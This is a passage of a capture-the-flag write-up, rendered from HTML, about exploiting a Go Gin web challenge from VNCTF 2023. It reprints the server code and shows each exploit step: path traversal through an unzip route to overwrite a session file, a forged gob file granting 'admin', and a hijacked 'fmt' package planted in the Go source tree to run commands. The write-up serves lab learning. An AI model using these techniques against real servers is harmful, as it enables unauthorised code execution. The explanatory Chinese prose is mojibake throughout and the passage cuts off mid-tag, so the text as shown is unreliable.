<span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">fileutil.CreateDir(userUploadDir) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ext := file.Filename[strings.LastIndex(file.Filename, <span class="string">&quot;.&quot;</span>):]</span><br><span class="line"><span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">filename := userUploadDir + file.Filename</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">fileutil.RemoveFile(filename)</span><br><span class="line">&#125;</span><br><span class="line">err = c.SaveUploadedFile(file, filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span> <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line"><span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">decoder := gob.NewDecoder(file)</span><br><span class="line"><span class="keyword">var</span> ctfer User</span><br><span class="line">decoder.Decode(&amp;ctfer)</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123; <span class="comment">//</span></span><br><span class="line">eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">&quot;:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŒ¨ä¸ªåˆ†æè·¯ç”±</p><p>é¦–å…ˆæ˜¯/</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    userDir := <span class="string">&quot;/tmp/&quot;</span> + cryptor.Md5String(c.ClientIP()+<span class="string">&quot;VNCTF2023GoGoGo~&quot;</span>) + <span class="string">&quot;/&quot;</span></span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="comment">// sessionä¸­çš„shallowçš„å€¼è®¾ç½®ä¸ºuserDirçš„å€¼ï¼Œå¹¶ä¸”ä¿å­˜è¿™ä¸ªsession</span></span><br><span class="line">    session.Set(<span class="string">&quot;shallow&quot;</span>, userDir) </span><br><span class="line">    session.Save()</span><br><span class="line">    <span class="comment">// ç”¨ä½ çš„userDiråˆ›å»ºä¸€ä¸ªç›®å½•</span></span><br><span class="line">    fileutil.CreateDir(userDir)</span><br><span class="line">    <span class="comment">// åœ¨ä½ çš„userdiré‡Œé¢åˆ›å»ºuser.gobæ–‡ä»¶</span></span><br><span class="line">    gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/user.gob</span></span><br><span class="line">    user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line">    <span class="comment">// å¯¹è±¡åºåˆ—åŒ–å­˜å…¥user.gob</span></span><br><span class="line">    encoder := gob.NewEncoder(gobFile)</span><br><span class="line">    encoder.Encode(user)</span><br><span class="line">    <span class="keyword">if</span> fileutil.IsExist(userDir) &amp;&amp; fileutil.IsExist(userDir+<span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">        c.HTML(<span class="number">200</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your path: &quot;</span> + userDir&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    c.HTML(<span class="number">500</span>, <span class="string">&quot;index.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to make user dir&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯/uploadè·¯ç”±</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;upload me!&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">r.POST(<span class="string">&quot;/upload&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">        c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">    fileutil.CreateDir(userUploadDir) <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">    file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no file upload&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    ext := file.Filename[strings.LastIndex(file.Filename, <span class="string">&quot;.&quot;</span>):]</span><br><span class="line">    <span class="keyword">if</span> ext == <span class="string">&quot;.gob&quot;</span> || ext == <span class="string">&quot;.go&quot;</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    filename := userUploadDir + file.Filename</span><br><span class="line">    <span class="keyword">if</span> fileutil.IsExist(filename) &#123;</span><br><span class="line">        fileutil.RemoveFile(filename)</span><br><span class="line">    &#125;</span><br><span class="line">    err = c.SaveUploadedFile(file, filename)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to save file&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    c.HTML(<span class="number">200</span>, <span class="string">&quot;upload.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;file saved to &quot;</span> + filename&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>ä»£ç æ²¡ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œè¿‡æ»¤äº†.gobå’Œ.goæ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶å­˜æ”¾åœ¨/tmp/{userDir}/upload</p><p>ç„¶åæ˜¯/unzipè·¯ç”±</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">        c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    userUploadDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>) + <span class="string">&quot;uploads/&quot;</span> <span class="comment">// /tmp/4b997ad5487153fba0162e525abd6b7d/uploads/</span></span><br><span class="line">    files, _ := fileutil.ListFileNames(userUploadDir)</span><br><span class="line">    destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">        <span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">            err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè·¯ç”±æ˜¯ä¸ªè§£å‹åŠŸèƒ½ï¼Œä¸‹é¢è¿™æ®µå°±æ˜¯å¦‚æœæ˜¯zipåˆ™è§£å‹åˆ°destpathè¿™ä¸ªè·¯å¾„ï¼Œ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">    <span class="keyword">if</span> fileutil.MiMeType(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">        err := fileutil.UnZip(userUploadDir+file, destPath)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            c.HTML(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå› ä¸ºä¸‹é¢è¿™æ®µä»£ç ï¼Œæ‰€ä»¥å¯ä»¥çŸ¥é“ï¼Œè§£å‹è·¯å¾„æ˜¯å¯æ§çš„ï¼Œå³åˆ©ç”¨..å°±å¯ä»¥è¾¾åˆ°è®¿é—®ä»»æ„ç›®å½•çš„ç›®çš„ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯æœ€åä¸€ä¸ªè·¯ç”±/backdoorã€‚åé—¨è·¯ç”±</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">        c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line">    <span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">        file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">        decoder := gob.NewDecoder(file)</span><br><span class="line">        <span class="keyword">var</span> ctfer User</span><br><span class="line">        decoder.Decode(&amp;ctfer)</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123; <span class="comment">//</span></span><br><span class="line">            eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(err)</span><br><span class="line">            &#125;</span><br><span class="line">            c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢ä¸»è¦æ˜¯ä¸¤ç‚¹ï¼Œctfer.Power == â€œadminâ€è¿™ä¸ªåˆ¤æ–­ï¼Œä»¥åŠevalæ–¹æ³•çš„åˆ©ç”¨ã€‚</p><ul><li>ctfer.Power == â€œadminâ€å¾ˆæ˜¾ç„¶è¦åˆ©ç”¨å‰é¢æ–‡ä»¶ä¸Šä¼ ï¼Œè¾¾åˆ°ä¸Šä¼ ä¸€ä¸ªuser.gobå¹¶ä¸”æ›¿æ¢åºåˆ—åŒ–å¯¹è±¡ä¸­çš„Powerçš„å€¼ã€‚è€Œè¿™ä¸ªé¢˜ç›®ç”±äºæœ‰ä¸ª/unzipå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç›´æ¥ç„¶ååˆ©ç”¨è§£å‹æŠŠæ–‡ä»¶æ”¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ä»»ä½•ä½ç½®ã€‚ä¿®æ”¹çš„ä»£ç å¦‚ä¸‹</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name  <span class="type">string</span></span><br><span class="line">Path  <span class="type">string</span></span><br><span class="line">Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">userDir := <span class="string">&quot;&quot;</span></span><br><span class="line">os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>) <span class="comment">// åˆ›å»ºæ–‡ä»¶ /tmp/4b997ad5487153fba0162e525abd6b7d/user.gob</span></span><br><span class="line">user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">encoder := gob.NewEncoder(gobFile)</span><br><span class="line">encoder.Encode(user)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠuser.gobå‹ç¼©ä¸€ä¸‹ï¼Œä¸Šä¼ ä¸Šå»</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230223175051058.png" alt="image-20230223175051058"></p><p>ç„¶åè®¿é—®å³å¯/unzip?path=../</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230223175241163.png" alt="image-20230223175241163"></p><ul><li>ç„¶åæ˜¯evalæ–¹æ³•åˆ©ç”¨</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼Œå†…å®¹æ˜¯ä¸å¯æ§çš„ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç‚¹ï¼Œè°ƒç”¨çš„å‡½æ•°å†…å®¹æˆ‘ä»¬æ˜¯å¯æ§çš„ã€‚</p><p>å› ä¸ºæ²¡æœ‰è§„å®šè¿™ä¸ªfmtä¸€å®šæ˜¯åŸæœ¬åº“é‡Œé¢çš„fmtï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è‡ªå·±ä¸Šä¼ ä¸€ä¸ªfmtå»ä»¤å…¶æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä»£ç ã€‚</p><p>å› æ­¤å¯ä»¥è‡ªå·±å†™ä¸€ä¸ªfmtæ¨¡å—</p><p>ä¾‹å¦‚ RCE/fmt</p><p>ç›®å½•ç»“æ„å¦‚ä¸‹:</p><p>RCE</p><p>â€‹    fmt</p><p>â€‹        â€“fmt.go</p><p>â€‹        â€“go.mod</p><p>æ“ä½œåœ¨fmtæ–‡ä»¶å¤¹ä¸‹é¢è°ƒç”¨go mod init fmt</p><p>ç„¶ågo.modé‡Œé¢å†…å®¹å¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module fmt</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="number">1.19</span></span><br><span class="line"></span><br><span class="line">require RCE/fmt v0<span class="number">.0</span><span class="number">.0</span></span><br><span class="line">replace RCE/fmt v0<span class="number">.0</span><span class="number">.0</span> =&gt; ../fmt</span><br></pre></td></tr></table></figure><p>fmt.goé‡Œé¢å†…å®¹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fmt</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;os/exec&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Println</span><span class="params">(cmd <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">out, _ := exec.Command(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/ffflllaaaggg&quot;</span>).Output()</span><br><span class="line"><span class="comment">// out, _ := exec.Command(&quot;whoami&quot;).Output()</span></span><br><span class="line">fmt.Println(<span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/local/go/src/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠæ–‡ä»¶å†…å®¹æ”¾åˆ°/usr/local/go/src/ç›®å½•ä¸‹é¢å°±å¯ä»¥äº†</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230223180503199.png" 